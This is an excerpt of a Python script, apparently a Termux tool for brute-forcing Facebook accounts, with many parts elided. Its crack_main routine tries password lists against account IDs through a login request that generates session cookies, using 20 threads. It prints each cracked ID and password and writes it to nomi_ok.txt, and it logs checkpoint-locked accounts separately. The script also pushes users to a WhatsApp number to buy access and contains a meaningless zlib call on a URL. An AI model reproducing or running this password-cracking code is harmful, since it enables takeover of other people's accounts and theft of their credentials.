#coding = utf-8
#tnx alot janj nomi hop
#script shared by nomi
...
#----[remover]-----
try:
	sz = zlib.decompress(b'https://github.com/muzamml134/app/tree/main')
except:
	sz=""
...
def qsbuy():
	try:
		...
		try:
			...
			os.system(f"termux-open-url https://wa.me/+923305196677?text={bumper}")
			qsbuy()
...
def main():
	...
	if menu_opt =='1':
		...
		xchker()
		os.system('xdg-open https://github.com/muzamml134')
		main()
	elif menu_opt =='4':
...
class crack_main():
	...
	def m1(self,iid,name,passlist):
		try:
			...
			sys.stdout.write('\r[nomi] %s / [OK-%s] \r'%(loop,len(ok)));sys.stdout.flush()
			fn = name.split(' ')[0]
			try:
				ln = name.split(' ')[1]
			except:
			...
			for pw in passlist:
				...
				data = {"locale":"en_US","format":"json","email":iid,"password":pas,"access_token":"","generate_session_cookies":1}
				...
				if 'session_key' in po:
					print(' \033[1;32m[nomi-OK] '+roid+' | '+pas+'\033[0;97m')
					open('/sdcard/nomi_ok.txt','a').write(roid+'|'+pas+'\n')
					ok.append(iid)
					break
				...
				if 'User must verify their account' in po:
					try:
						print(' \033[1;31m[nomi-CP] '+roid+' | '+pas+'\033[0;97m')
						open('/sdcard/nomi_cp.txt','a').write(roid+'|'+pas+'\n')
						break
					except Exception as e:
						pass
				else:
	...
	def pasw(self):
		...
		print(' Ok Ids Save In : /sdcard/nomi_ok.txt')
		print(50*'-')
		input('\n Press enter to back ')
		main()
...
def new_file(cookies,access_token):
	...
	with ThreadPool(max_workers=20) as yaari:
		for exid in file:
			yaari.submit(iamBadBoy, exid,cookies,access_token,sf)
	try:
		son = f"nomi{str(random.randint(0,90))}.txt"
	except:
		son = f"nomi{str(random.randint(10,50))}.txt"
